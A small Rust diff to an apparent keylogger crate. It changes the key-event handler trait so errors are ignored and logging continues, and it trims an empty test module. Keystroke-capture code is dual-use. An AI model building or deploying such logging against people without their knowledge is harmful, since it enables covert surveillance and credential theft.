@@ -12,8 +12,9 @@ pub(crate) type KeyloggerResult<T> = Result<T, KeyloggerError>;
 pub trait KeyEventHandler: Send + Sync {
     async fn handle_events(&self, kb_device: &Path, kb_name: &str, ev: Vec<KeyEvent>);
 
-    fn handle_err(&self, err: KeyloggerError) -> Result<(), KeyloggerError> {
-        Err(err)
+    fn handle_err(&self, _err: KeyloggerError) -> Result<(), KeyloggerError> {
+        // Ignore the error and keep on logging
+        Ok(())
     }
 }
 
@@ -78,7 +79,7 @@ async fn handle_key_events(
 
 #[cfg(test)]
 mod tests {
-    use super::*;
+    
 
     // TODO
 }
